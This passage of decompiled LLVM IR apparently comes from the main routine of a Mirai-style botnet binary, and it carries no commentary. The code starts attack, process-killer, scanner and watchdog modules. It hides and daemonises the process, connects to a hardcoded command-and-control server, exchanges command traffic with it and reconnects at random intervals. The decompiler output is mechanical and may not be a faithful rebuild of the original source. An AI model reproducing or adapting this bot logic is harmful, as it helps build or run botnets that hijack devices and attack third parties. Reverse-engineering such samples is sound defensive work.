  %v3_dc68 = call i32 @util_strcpy(i8* %v2_dc68, i32 %v2_dc3c)
  store i32 32, i32* @r1, align 4
  store i32 %v2_dc3c, i32* @r0, align 4
  %v0_dc74 = call i32 @util_zero()
  %v0_dc78 = call i32 @rand_next()
  store i32 %v0_dc78, i32* @r7, align 4
  %v0_dc80 = load i32, i32* @r8, align 4
  %v1_dc80 = inttoptr i32 %v0_dc80 to i32*
  %v2_dc80 = load i32, i32* %v1_dc80, align 4
  %v1_dc84 = inttoptr i32 %v2_dc80 to i8*
  %v2_dc84 = call i32 @util_strlen(i8* %v1_dc84)
  store i32 %v2_dc84, i32* @r6, align 4
  %v0_dc8c = load i32, i32* @r8, align 4
  %v1_dc8c = inttoptr i32 %v0_dc8c to i32*
  %v2_dc8c = load i32, i32* %v1_dc8c, align 4
  %v1_dc90 = inttoptr i32 %v2_dc8c to i8*
  %v2_dc90 = call i32 @util_strlen(i8* %v1_dc90)
  %v0_dc94 = load i32, i32* @r6, align 4
  %v1_dc94 = sub i32 20, %v0_dc94
  %v0_dc9c = load i32, i32* @r7, align 4
  %v3_dca0 = urem i32 %v0_dc9c, %v1_dc94
  %v2_dca4 = add i32 %v3_dca0, %v2_dc90
  store i32 %v2_dca4, i32* @r4, align 4
  %v2_dcb0 = call i32 @rand_alpha_str(i32 %v2_dc3c, i32 %v2_dca4)
  store i32 %v2_dc50, i32* %r2.global-to-local, align 4
  %v1_dcb8 = load i32, i32* @r4, align 4
  %v2_dcb8 = add i32 %v1_dcb8, %v2_dc50
  store i32 %v2_dcb8, i32* %r3.global-to-local, align 4
  %v0_dcbc = load i32, i32* @sl, align 4
  %v1_dcbc = trunc i32 %v0_dcbc to i8
  %v3_dcbc = add i32 %v2_dcb8, -80
  %v4_dcbc = inttoptr i32 %v3_dcbc to i8*
  store i8 %v1_dcbc, i8* %v4_dcbc, align 1
  %v4_dcc8 = call i32 @prctl(i32 15, i32 %v2_dc3c, i32 %v2_dc50, i32 %v2_dcb8)
  %v1_dcd0 = call i32 @table_unlock_val(i32 5)
  %v3_dce0 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_dce4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dce4, i32* @r2, align 4
  %v2_dcf0 = call i32 @__GI___libc_write(i32 1, i32 %v3_dce0)
  store i32 1, i32* @r2, align 4
  %v2_dd00 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_19abc.105 to i32))
  %v1_dd08 = call i32 @table_lock_val(i32 5)
  %v1_dd0c = call i32 @attack_init(i32 %v1_dd08)
  %v1_dd10 = call i32 @killer_init(i32 %v1_dd0c)
  %v1_dd14 = call i32 @watchdog_maintain(i32 %v1_dd10)
  %v0_dd18 = call i32 @__libc_fork()
  %v1_dd1c = load i32, i32* @sl, align 4
  %v7_dd20 = icmp sgt i32 %v0_dd18, %v1_dd1c
  br i1 %v7_dd20, label %dec_label_pc_dd24, label %dec_label_pc_dd70

dec_label_pc_dd24:                                ; preds = %dec_label_pc_dc10
  ret i32 %v1_dd1c

dec_label_pc_dd38:                                ; preds = %entry
  %v0_dd38 = load i32, i32* @r8, align 4
  %v1_dd38 = add i32 %v0_dd38, 4
  %v2_dd38 = inttoptr i32 %v1_dd38 to i32*
  %v3_dd38 = load i32, i32* %v2_dd38, align 4
  %v1_dd3c = inttoptr i32 %v3_dd38 to i8*
  %v2_dd3c = call i32 @util_strlen(i8* %v1_dd3c)
  %v8_dd44 = icmp sgt i32 %v2_dd3c, 31
  br i1 %v8_dd44, label %dec_label_pc_dc10, label %dec_label_pc_dd48

dec_label_pc_dd48:                                ; preds = %dec_label_pc_dd38
  %v0_dd48 = load i32, i32* @r8, align 4
  %v1_dd48 = add i32 %v0_dd48, 4
  %v2_dd48 = inttoptr i32 %v1_dd48 to i32*
  %v3_dd48 = load i32, i32* %v2_dd48, align 4
  store i32 %v2_dbec, i32* @r0, align 4
  %v2_dd50 = bitcast i32* %stack_var_-152 to i8*
  %v3_dd50 = call i32 @util_strcpy(i8* %v2_dd50, i32 %v3_dd48)
  %v0_dd54 = load i32, i32* @r8, align 4
  %v1_dd54 = add i32 %v0_dd54, 4
  %v2_dd54 = inttoptr i32 %v1_dd54 to i32*
  %v3_dd54 = load i32, i32* %v2_dd54, align 4
  %v1_dd5c = inttoptr i32 %v3_dd54 to i8*
  %v2_dd5c = call i32 @util_strlen(i8* %v1_dd5c)
  store i32 %v2_dd5c, i32* @r1, align 4
  store i32 %v3_dd54, i32* @r0, align 4
  %v0_dd68 = call i32 @util_zero()
  br label %dec_label_pc_dc10

dec_label_pc_dd70:                                ; preds = %dec_label_pc_dc10
  %v1_dd70 = call i32 @__GI_setsid(i32 %v0_dd18)
  %v0_dd78 = load i32, i32* @sl, align 4
  %v1_dd7c = call i32 @__GI___libc_close(i32 %v0_dd78)
  %v1_dd84 = call i32 @__GI___libc_close(i32 1)
  %v1_dd8c = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_222f0.107 to i32), i32* @fp, align 4
  %v1_dd94 = call i32 @attack_init(i32 %v1_dd8c)
  %v1_dd98 = call i32 @killer_init(i32 %v1_dd94)
  %v1_dd9c = call i32 @watchdog_maintain(i32 %v1_dd98)
  %v1_dda0 = call i32 @scanner_init(i32 %v1_dd9c)
  %v0_dda4 = load i32, i32* @sl, align 4
  %v2_dda8 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_dda8, i32* @r7, align 4
  %v2_ddac = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_ddac, i32* @r6, align 4
  %v2_de8c = ptrtoint i32* %stack_var_-72 to i32
  %v2_dedc = ptrtoint i32* %stack_var_-168 to i32
  %v2_e0b8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_e0c0 = ptrtoint i8** %stack_var_-42 to i32
  %v2_e268 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_e0dc = ptrtoint i32* %stack_var_-52 to i32
  %v1_e190 = bitcast i32* %stack_var_-152 to i8*
  %v2_e150 = ptrtoint i32* %stack_var_-88 to i32
  %v1_e16c = sub i32 0, %v1_dd70
  br label %dec_label_pc_ddb0

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_e1f0, %dec_label_pc_e28c, %bb44, %dec_label_pc_e18c, %dec_label_pc_dfc0, %dec_label_pc_dfb0, %bb41, %dec_label_pc_e2e0, %dec_label_pc_e24c, %dec_label_pc_e200, %dec_label_pc_e1dc, %dec_label_pc_e108, %dec_label_pc_e030, %dec_label_pc_df68, %dec_label_pc_dd70
  %stack_var_-1436.0 = phi i32 [ %v0_dda4, %dec_label_pc_dd70 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_dfb0 ], [ %stack_var_-1436.1, %dec_label_pc_dfc0 ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_e200 ], [ %stack_var_-1436.1, %dec_label_pc_e030 ], [ %stack_var_-1436.1, %dec_label_pc_e28c ], [ %stack_var_-1436.1, %dec_label_pc_e2e0 ], [ %stack_var_-1436.1, %dec_label_pc_e24c ], [ %stack_var_-1436.1, %dec_label_pc_df68 ], [ %stack_var_-1436.1, %dec_label_pc_e18c ], [ %stack_var_-1436.1, %dec_label_pc_e1dc ], [ %stack_var_-1436.1, %dec_label_pc_e108 ], [ %stack_var_-1436.1, %dec_label_pc_e1f0 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_ddbc, %dec_label_pc_ddb0
  %v1_ddc0 = phi i32 [ %v1_ddc4, %dec_label_pc_ddbc ], [ 4, %dec_label_pc_ddb0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ddc0 = load i32, i32* @r7, align 4
  %v3_ddc0 = add i32 %v2_ddc0, %v1_ddc0
  %v4_ddc0 = inttoptr i32 %v3_ddc0 to i32*
  store i32 0, i32* %v4_ddc0, align 4
  %v0_ddc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_ddc4 = add i32 %v0_ddc4, 4
  store i32 %v1_ddc4, i32* %r3.global-to-local, align 4
  %v7_ddc8 = icmp eq i32 %v1_ddc4, 128
  br i1 %v7_ddc8, label %dec_label_pc_ddd0, label %dec_label_pc_ddbc

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_ddbc
  %v0_ddd0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ddd0, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ddd8

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_ddd8, %dec_label_pc_ddd0
  %v1_dddc = phi i32 [ %v1_dde0, %dec_label_pc_ddd8 ], [ 4, %dec_label_pc_ddd0 ]
  store i32 0, i32* @r4, align 4
  %v2_dddc = load i32, i32* @r6, align 4
  %v3_dddc = add i32 %v2_dddc, %v1_dddc
  %v4_dddc = inttoptr i32 %v3_dddc to i32*
  store i32 0, i32* %v4_dddc, align 4
  %v0_dde0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dde0 = add i32 %v0_dde0, 4
  store i32 %v1_dde0, i32* %r3.global-to-local, align 4
  %v7_dde4 = icmp eq i32 %v1_dde0, 128
  br i1 %v7_dde4, label %dec_label_pc_ddec, label %dec_label_pc_ddd8

dec_label_pc_ddec:                                ; preds = %dec_label_pc_ddd8
  store i32 ptrtoint (i32* @global_var_222ec.88 to i32), i32* %r3.global-to-local, align 4
  %v2_ddf0 = load i32, i32* @global_var_222ec.88, align 4
  %v7_ddf4 = icmp eq i32 %v2_ddf0, -1
  br i1 %v7_ddf4, label %dec_label_pc_de20, label %dec_label_pc_ddfc

dec_label_pc_ddfc:                                ; preds = %dec_label_pc_ddec
  %v3_ddfc = udiv i32 %v2_ddf0, 32
  %v3_de00 = mul nuw nsw i32 %v3_ddfc, 4
  store i32 %v2_dc50, i32* %ip.global-to-local, align 4
  %v2_de08 = add i32 %v3_de00, %v2_dc50
  store i32 %v2_de08, i32* %r3.global-to-local, align 4
  %v1_de0c = add i32 %v2_de08, -240
  %v2_de0c = inttoptr i32 %v1_de0c to i32*
  %v3_de0c = load i32, i32* %v2_de0c, align 4
  %v1_de10 = urem i32 %v2_ddf0, 32
  %v7_de18 = shl i32 1, %v1_de10
  %v8_de18 = or i32 %v3_de0c, %v7_de18
  store i32 %v8_de18, i32* %r2.global-to-local, align 4
  store i32 %v8_de18, i32* %v2_de0c, align 4
  br label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %dec_label_pc_ddec, %dec_label_pc_ddfc
  %v2_de20 = load i32, i32* @global_var_222f0.107, align 4
  store i32 %v2_de20, i32* @r3, align 4
  %v7_de24 = icmp eq i32 %v2_de20, -1
  store i32 ptrtoint (i32* @global_var_222f0.107 to i32), i32* @r8, align 4
  br i1 %v7_de24, label %dec_label_pc_e048, label %dec_label_pc_de30

dec_label_pc_de30:                                ; preds = %dec_label_pc_e048, %dec_label_pc_de20, %bb43
  %v2_de34 = load i8, i8* bitcast (i8** @global_var_22470.110 to i8*), align 4
  %v2_de38 = icmp eq i8 %v2_de34, 0
  %v2_df84 = load i32, i32* @global_var_222f0.107, align 4
  store i32 %v2_df84, i32* %ip.global-to-local, align 4
  %v3_df88 = udiv i32 %v2_df84, 32
  store i32 %v3_df88, i32* %r3.global-to-local, align 4
  br i1 %v2_de38, label %dec_label_pc_df84, label %dec_label_pc_de40

dec_label_pc_de40:                                ; preds = %dec_label_pc_de30
  %v3_de4c = mul nuw nsw i32 %v3_df88, 4
  %v2_de50 = add i32 %v3_de4c, %v2_dc50
  store i32 %v2_de50, i32* %r3.global-to-local, align 4
  %v1_de54 = add i32 %v2_de50, -368
  %v2_de54 = inttoptr i32 %v1_de54 to i32*
  %v3_de54 = load i32, i32* %v2_de54, align 4
  %v1_de58 = urem i32 %v2_df84, 32
  %v7_de60 = shl i32 1, %v1_de58
  %v8_de60 = or i32 %v3_de54, %v7_de60
  store i32 %v8_de60, i32* %r2.global-to-local, align 4
  store i32 %v8_de60, i32* %v2_de54, align 4
  br label %dec_label_pc_de68

dec_label_pc_de68:                                ; preds = %dec_label_pc_df84, %dec_label_pc_de40
  store i32 ptrtoint (i32* @global_var_222ec.88 to i32), i32* %r3.global-to-local, align 4
  %v2_de6c = load i32, i32* @global_var_222ec.88, align 4
  store i32 0, i32* @lr, align 4
  %v0_de74 = load i32, i32* %ip.global-to-local, align 4
  %v5_de78 = icmp slt i32 %v0_de74, %v2_de6c
  br i1 %v5_de78, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_de68
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_de68, %bb
  %v0_de88 = phi i32 [ %v2_de6c, %dec_label_pc_de68 ], [ %v0_de74, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_de88 = add i32 %v0_de88, 1
  store i32 %v2_de8c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ddac, i32* %r2.global-to-local, align 4
  %v5_dea4 = call i32 @__libc_select(i32 %v1_de88, i32 %v2_dda8, i32 %v2_ddac, i32 0, i32 %v2_de8c)
  %v8_dea8 = icmp eq i32 %v5_dea4, -1
  br i1 %v8_dea8, label %dec_label_pc_ddb0, label %dec_label_pc_deb0

dec_label_pc_deb0:                                ; preds = %bb41
  %v6_dea4 = trunc i32 %v5_dea4 to i16
  %v3_deb0 = icmp eq i16 %v6_dea4, 0
  br i1 %v3_deb0, label %dec_label_pc_deb8, label %dec_label_pc_deec

dec_label_pc_deb8:                                ; preds = %dec_label_pc_deb0
  %v5_dec4 = srem i32 %stack_var_-1436.0, 6
  %v4_decc = sub i32 %stack_var_-1436.0, %v5_dec4
  store i32 %v4_decc, i32* %r3.global-to-local, align 4
  %v2_ded4 = icmp eq i32 %v5_dec4, 0
  %v1_ded8 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_ded8, i32* @lr, align 4
  store i32 %v2_dedc, i32* %r2.global-to-local, align 4
  %v7_dee0 = inttoptr i32 %v5_dea4 to i8*
  store i8* %v7_dee0, i8** %stack_var_-42, align 4
  br i1 %v2_ded4, label %dec_label_pc_e0b8, label %dec_label_pc_deec

dec_label_pc_deec:                                ; preds = %dec_label_pc_deb0, %dec_label_pc_deb8, %dec_label_pc_e0b8
  %stack_var_-1436.1 = phi i32 [ %v1_ded8, %dec_label_pc_e0b8 ], [ %v1_ded8, %dec_label_pc_deb8 ], [ %stack_var_-1436.0, %dec_label_pc_deb0 ]
  store i32 ptrtoint (i32* @global_var_222ec.88 to i32), i32* %r3.global-to-local, align 4
  %v2_def0 = load i32, i32* @global_var_222ec.88, align 4
  %v7_def4 = icmp eq i32 %v2_def0, -1
  br i1 %v7_def4, label %dec_label_pc_df20, label %dec_label_pc_defc

dec_label_pc_defc:                                ; preds = %dec_label_pc_deec
  %v3_defc = udiv i32 %v2_def0, 32
  %v3_df00 = mul nuw nsw i32 %v3_defc, 4
  store i32 %v2_dc50, i32* %ip.global-to-local, align 4
  %v2_df08 = add i32 %v3_df00, %v2_dc50
  store i32 %v2_df08, i32* %r3.global-to-local, align 4
  %v1_df0c = add i32 %v2_df08, -240
  %v2_df0c = inttoptr i32 %v1_df0c to i32*
  %v3_df0c = load i32, i32* %v2_df0c, align 4
  %v1_df10 = urem i32 %v2_def0, 32
  %v6_df14 = ashr i32 %v3_df0c, %v1_df10
  store i32 %v6_df14, i32* %r2.global-to-local, align 4
  %v1_df18 = urem i32 %v6_df14, 2
  %v2_df18 = icmp eq i32 %v1_df18, 0
  br i1 %v2_df18, label %dec_label_pc_df20, label %dec_label_pc_e144

dec_label_pc_df20:                                ; preds = %dec_label_pc_defc, %dec_label_pc_deec
  %v2_df24 = load i8, i8* bitcast (i8** @global_var_22470.110 to i8*), align 4
  %v3_df24 = zext i8 %v2_df24 to i32
  store i32 %v3_df24, i32* @r4, align 4
  %v2_df28 = icmp eq i8 %v2_df24, 0
  %v2_dfb0 = load i32, i32* @global_var_222f0.107, align 4
  br i1 %v2_df28, label %dec_label_pc_dfb0, label %dec_label_pc_df30

dec_label_pc_df30:                                ; preds = %dec_label_pc_df20
  %v3_df34 = udiv i32 %v2_dfb0, 32
  store i32 %v2_dc50, i32* %r2.global-to-local, align 4
  %v3_df3c = mul nuw nsw i32 %v3_df34, 4
  %v2_df40 = add i32 %v3_df3c, %v2_dc50
  store i32 %v2_df40, i32* %r3.global-to-local, align 4
  %v1_df44 = add i32 %v2_df40, -368
  %v2_df44 = inttoptr i32 %v1_df44 to i32*
  %v3_df44 = load i32, i32* %v2_df44, align 4
  %v1_df48 = urem i32 %v2_dfb0, 32
  %v6_df4c = ashr i32 %v3_df44, %v1_df48
  store i32 %v6_df4c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22470.110 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_df58 = urem i32 %v6_df4c, 2
  %v2_df58 = icmp eq i32 %v1_df58, 0
  store i8 0, i8* bitcast (i8** @global_var_22470.110 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_222f0.107 to i32), i32* @r5, align 4
  br i1 %v2_df58, label %dec_label_pc_df68, label %dec_label_pc_e0d4

dec_label_pc_df68:                                ; preds = %dec_label_pc_df30
  store i32 57200, i32* @lr, align 4
  %v1_df6c = icmp ne i32 %v2_dfb0, -1
  call void @__pseudo_cond_branch(i1 %v1_df6c, i32 ptrtoint (i32* @global_var_14aa0.112 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_df74 = load i32, i32* @r5, align 4
  %v2_df74 = inttoptr i32 %v1_df74 to i32*
  store i32 -1, i32* %v2_df74, align 4
  %v1_df7c = call i32 @sleep(i32 1)
  br label %dec_label_pc_ddb0

dec_label_pc_df84:                                ; preds = %dec_label_pc_de30
  store i32 %v2_dc50, i32* %r2.global-to-local, align 4
  %v3_df90 = mul nuw nsw i32 %v3_df88, 4
  %v2_df94 = add i32 %v3_df90, %v2_dc50
  store i32 %v2_df94, i32* %r3.global-to-local, align 4
  %v1_df98 = add i32 %v2_df94, -240
  %v2_df98 = inttoptr i32 %v1_df98 to i32*
  %v3_df98 = load i32, i32* %v2_df98, align 4
  %v1_df9c = urem i32 %v2_df84, 32
  %v7_dfa4 = shl i32 1, %v1_df9c
  %v8_dfa4 = or i32 %v3_df98, %v7_dfa4
  store i32 %v8_dfa4, i32* %r2.global-to-local, align 4
  store i32 %v8_dfa4, i32* %v2_df98, align 4
  br label %dec_label_pc_de68

dec_label_pc_dfb0:                                ; preds = %dec_label_pc_df20
  %v7_dfb4 = icmp eq i32 %v2_dfb0, -1
  store i32 ptrtoint (i32* @global_var_222f0.107 to i32), i32* @r8, align 4
  br i1 %v7_dfb4, label %dec_label_pc_ddb0, label %dec_label_pc_dfc0

dec_label_pc_dfc0:                                ; preds = %dec_label_pc_dfb0
  %v3_dfc0 = udiv i32 %v2_dfb0, 32
  store i32 %v2_dc50, i32* %r2.global-to-local, align 4
  %v3_dfc8 = mul nuw nsw i32 %v3_dfc0, 4
  %v2_dfcc = add i32 %v3_dfc8, %v2_dc50
  store i32 %v2_dfcc, i32* %r3.global-to-local, align 4
  %v1_dfd0 = add i32 %v2_dfcc, -240
  %v2_dfd0 = inttoptr i32 %v1_dfd0 to i32*
  %v3_dfd0 = load i32, i32* %v2_dfd0, align 4
  %v1_dfd4 = urem i32 %v2_dfb0, 32
  %v6_dfd8 = ashr i32 %v3_dfd0, %v1_dfd4
  store i32 %v6_dfd8, i32* %r2.global-to-local, align 4
  %v1_dfdc = urem i32 %v6_dfd8, 2
  %v2_dfdc = icmp eq i32 %v1_dfdc, 0
  br i1 %v2_dfdc, label %dec_label_pc_ddb0, label %dec_label_pc_dfe4

dec_label_pc_dfe4:                                ; preds = %dec_label_pc_dfc0
  %v6_dfe8 = inttoptr i32 %v3_df24 to i8*
  store i8* %v6_dfe8, i8** %stack_var_-42, align 4
  store i32 %v2_e0c0, i32* @sl, align 4
  %v0_dfec = call i32 @__GI___errno_location()
  %v0_dff0 = load i32, i32* @r4, align 4
  %v2_dff0 = inttoptr i32 %v0_dfec to i32*
  store i32 %v0_dff0, i32* %v2_dff0, align 4
  store i32 %v0_dfec, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e000 = load i32, i32* @global_var_222f0.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_e00c = call i32 @__libc_recv(i32 %v2_e000, i32 %v2_e0c0, i32 2, i32 16386)
  %v7_e010 = icmp eq i32 %v4_e00c, -1
  br i1 %v7_e010, label %dec_label_pc_e1f0, label %dec_label_pc_e018

dec_label_pc_e018:                                ; preds = %dec_label_pc_dfe4
  %v2_e018 = icmp eq i32 %v4_e00c, 0
  br i1 %v2_e018, label %dec_label_pc_e200, label %dec_label_pc_e020

dec_label_pc_e020:                                ; preds = %dec_label_pc_e018
  store i32 %v2_dedc, i32* %ip.global-to-local, align 4
  %v3_e024 = load i8*, i8** %stack_var_-42, align 4
  %v4_e024 = ptrtoint i8* %v3_e024 to i32
  store i32 %v4_e024, i32* %r3.global-to-local, align 4
  %v2_e028 = icmp eq i8* %v3_e024, null
  br i1 %v2_e028, label %dec_label_pc_e030, label %dec_label_pc_e230

dec_label_pc_e030:                                ; preds = %dec_label_pc_e020
  %v2_e030 = load i32, i32* @global_var_222f0.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_e03c = add i32 %v4_e024, 16384
  store i32 %v1_e03c, i32* %r3.global-to-local, align 4
  %v4_e040 = call i32 @__libc_recv(i32 %v2_e030, i32 %v2_e0c0, i32 2, i32 %v1_e03c)
  br label %dec_label_pc_ddb0

dec_label_pc_e048:                                ; preds = %dec_label_pc_de20
  %v0_e050 = load i32, i32* @r4, align 4
  store i32 %v0_e050, i32* %r2.global-to-local, align 4
  %v3_e054 = call i32 @socket(i32 2, i32 1, i32 %v0_e050)
  %v7_e058 = icmp eq i32 %v3_e054, -1
  store i32 %v3_e054, i32* @r5, align 4
  %v1_e060 = load i32, i32* @r8, align 4
  %v2_e060 = inttoptr i32 %v1_e060 to i32*
  store i32 %v3_e054, i32* %v2_e060, align 4
  br i1 %v7_e058, label %dec_label_pc_de30, label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %dec_label_pc_e048
  %v0_e068 = load i32, i32* @r4, align 4
  store i32 %v0_e068, i32* @r2, align 4
  %v2_e070 = call i32 @__libc_fcntl(i32 %v3_e054, i32 3)
  %v1_e078 = or i32 %v2_e070, 2048
  store i32 %v1_e078, i32* @r2, align 4
  %v0_e07c = load i32, i32* @r5, align 4
  %v2_e080 = call i32 @__libc_fcntl(i32 %v0_e07c, i32 4)
  %v2_e088 = load i32, i32* @global_var_222f4.86, align 4
  store i32 %v2_e088, i32* %r3.global-to-local, align 4
  %v2_e08c = icmp eq i32 %v2_e088, 0
  br i1 %v2_e08c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_e068
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_e068, %bb42
  %v2_e094 = xor i1 %v2_e08c, true
  call void @__pseudo_cond_branch(i1 %v2_e094, i32 ptrtoint (i32* @global_var_10e64.113 to i32))
  store i32 ptrtoint (i8** @global_var_22470.110 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_e0a0 = load i32, i32* @global_var_222f0.107, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_22470.110 to i8*), align 4
  %v4_e0b0 = call i32 @__libc_connect(i32 %v2_e0a0, i32 ptrtoint (i16** @global_var_24f8c.93 to i32), i32 16)
  br label %dec_label_pc_de30

dec_label_pc_e0b8:                                ; preds = %dec_label_pc_deb8
  %v2_e0bc = load i32, i32* @global_var_222f0.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e0cc = call i32 @__libc_send(i32 %v2_e0bc, i32 %v2_e0c0, i32 2, i32 16384)
  br label %dec_label_pc_deec

dec_label_pc_e0d4:                                ; preds = %dec_label_pc_df30
  store i32 4, i32* @r4, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_e0b8, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_e0f8 = call i32 @getsockopt(i32 %v2_dfb0, i32 1, i32 4, i32 %v2_e0dc, i32 %v2_e0b8)
  %v3_e0fc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e0fc, i32* %r3.global-to-local, align 4
  %v2_e100 = icmp eq i32 %v3_e0fc, 0
  br i1 %v2_e100, label %dec_label_pc_e18c, label %dec_label_pc_e108

dec_label_pc_e108:                                ; preds = %dec_label_pc_e0d4
  %v2_e108 = load i32, i32* @global_var_222f0.107, align 4
  %v1_e10c = call i32 @__GI___libc_close(i32 %v2_e108)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e114 = load i32, i32* @r5, align 4
  %v2_e114 = inttoptr i32 %v1_e114 to i32*
  store i32 -1, i32* %v2_e114, align 4
  %v0_e118 = call i32 @rand_next()
  %v3_e120 = zext i32 %v0_e118 to i64
  %v4_e120 = mul nuw i64 %v3_e120, 3435973837
  %v7_e120 = trunc i64 %v4_e120 to i32
  store i32 %v7_e120, i32* %ip.global-to-local, align 4
  %v3_e1242 = udiv i64 %v4_e120, 34359738368
  %v3_e1284 = mul nuw nsw i64 %v3_e1242, 8
  %v3_e128 = trunc i64 %v3_e1284 to i32
  store i32 %v3_e128, i32* %r2.global-to-local, align 4
  %v2_e12c6 = mul nuw nsw i64 %v3_e1242, 2
  %v2_e12c = trunc i64 %v2_e12c6 to i32
  %v2_e130 = add i32 %v3_e128, %v2_e12c
  store i32 %v2_e130, i32* %r3.global-to-local, align 4
  %v2_e134 = sub i32 %v0_e118, %v2_e130
  %v1_e138 = add i32 %v2_e134, 1
  %v1_e13c = call i32 @sleep(i32 %v1_e138)
  br label %dec_label_pc_ddb0

dec_label_pc_e144:                                ; preds = %dec_label_pc_defc
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_e158 = call i32 @__libc_accept(i32 %v2_def0, i32 %v2_e150, i32 %v2_e0dc, i32 16, i32 16)
  %v1_e15c = call i32 @scanner_kill(i32 %v5_e158)
  %v1_e160 = call i32 @killer_kill(i32 %v1_e15c)
  %v2_e170 = call i32 @kill(i32 %v1_e16c, i32 9)
  store i32 ptrtoint (i32* @global_var_2246c.97 to i32), i32* %r3.global-to-local, align 4
  %v2_e178 = load i32, i32* @global_var_2246c.97, align 4
  %v2_e17c = icmp eq i32 %v2_e178, 0
  br i1 %v2_e17c, label %dec_label_pc_e184, label %dec_label_pc_e224

dec_label_pc_e184:                                ; preds = %dec_label_pc_e144, %dec_label_pc_e224
  %v1_e188 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_e18c

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e0d4, %dec_label_pc_e184
  %v2_e190 = call i32 @util_strlen(i8* %v1_e190)
  %sext = mul i32 %v2_e190, 16777216
  %v1_e194 = sdiv i32 %sext, 16777216
  %v7_e194 = inttoptr i32 %v1_e194 to i8*
  store i8* %v7_e194, i8** %stack_var_-42, align 4
  %v0_e198 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32* @lr, align 4
  %v0_e1a0 = load i32, i32* @r4, align 4
  store i32 %v0_e1a0, i32* %r2.global-to-local, align 4
  store i32 %v0_e198, i32* @global_var_24f80.59, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e1b0 = load i32, i32* @r5, align 4
  %v1_e1b0 = inttoptr i32 %v0_e1b0 to i32*
  %v2_e1b0 = load i32, i32* %v1_e1b0, align 4
  %v4_e1b4 = call i32 @__libc_send(i32 %v2_e1b0, i32 ptrtoint (i32* @global_var_19ac0.117 to i32), i32 %v0_e1a0, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_e1c0 = load i32, i32* @r5, align 4
  %v1_e1c0 = inttoptr i32 %v0_e1c0 to i32*
  %v2_e1c0 = load i32, i32* %v1_e1c0, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e1cc = call i32 @__libc_send(i32 %v2_e1c0, i32 %v2_e0c0, i32 1, i32 16384)
  %v3_e1d0 = load i8*, i8** %stack_var_-42, align 4
  %v4_e1d0 = ptrtoint i8* %v3_e1d0 to i32
  store i32 %v4_e1d0, i32* %r2.global-to-local, align 4
  %v3_e1d4 = icmp eq i8* %v3_e1d0, null
  br i1 %v3_e1d4, label %dec_label_pc_ddb0, label %dec_label_pc_e1dc

dec_label_pc_e1dc:                                ; preds = %dec_label_pc_e18c
  %v0_e1dc = load i32, i32* @r5, align 4
  %v1_e1dc = inttoptr i32 %v0_e1dc to i32*
  %v2_e1dc = load i32, i32* %v1_e1dc, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e1e8 = call i32 @__libc_send(i32 %v2_e1dc, i32 %v2_dbec, i32 %v4_e1d0, i32 16384)
  br label %dec_label_pc_ddb0

dec_label_pc_e1f0:                                ; preds = %dec_label_pc_e260, %dec_label_pc_dfe4
  %v0_e1f0 = load i32, i32* @r5, align 4
